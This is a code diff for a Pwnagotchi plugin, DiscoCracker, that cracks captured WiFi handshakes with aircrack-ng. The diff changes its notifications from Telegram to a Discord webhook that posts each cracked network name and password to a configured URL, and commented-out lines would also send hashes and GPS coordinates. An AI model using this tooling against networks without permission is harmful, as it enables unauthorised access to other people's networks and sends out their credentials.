@@ -1,7 +1,10 @@
 from pwnagotchi import plugins
+import pwnagotchi
 import logging
 import subprocess
 import string
+import requests
+import json
 import re
 import os
 
@@ -32,6 +35,7 @@ class DiscoCracker(plugins.Plugin):
     def __init__(self):
         self.text_to_set = ""
 
+
     def on_loaded(self):
         logging.info('[discocracker] plugin loaded')
 
@@ -54,8 +58,6 @@ class DiscoCracker(plugins.Plugin):
         else:
             logging.warning('[discocracker] aircrack-ng is not installed!')
 
-        #if self.options['id'] != None and self.options['api'] != None:
-            #self._send_message(filename='Android AP', pwd='12345678')
 
     def on_handshake(self, agent, filename, access_point, client_station):
         display = agent.view()
@@ -93,9 +95,40 @@ class DiscoCracker(plugins.Plugin):
             ssid = base_filename.split('_')[0:-2]
             password = pwd
             
-            message_text = f"\nSSID: {ssid}\nPassword: {password}\n```\n{q.read()}\n```"
-            bot.send_message(chat_id=chat_id, text=message_text, parse_mode='Markdown')
-            logging.info(message_text)
+            message_text = f"SSID: {ssid}\nPassword: {password}"
+            data = {
+                'embeds': [
+                    {
+                    'title': '(·ω·) {} sniffed a new hash!'.format(pwnagotchi.name()), 
+                    'color': 289968,
+                    'description': '__**Captured WiFi info**__',
+                    'fields': [
+                        {
+                            'name': 'Captured info',
+                            'value': '`{}`'.format(message_text),
+                            'inline': False
+                        },
+                        # {
+                        #     'name': 'Hash:',
+                        #     'value': '`{}`'.format(hash_data),
+                        #     'inline': False
+                        # },
+                        # {
+                        #     'name': '__**Location Information**__',
+                        #     'value': '[GPS Waypoint]({})'.format(loc_url),
+                        #     'inline': False
+                        # },
+                        # {
+                        #     'name': 'Raw Coordinates:',
+                        #     'value': '```{},{}```'.format(lat,lon),
+                        #     'inline': False
+                        # },
+                    ]
+                    }
+                ]
+            }
+            requests.post(self.options['webhook_url'], files={'payload_json': (None, json.dumps(data))})
+            logging.debug('[*] DiscoHash: Webhook sent!')
 
         except Exception as e:
             logging.error(f"[discocracker] Error sending notificationto Discord: {str(e)}")
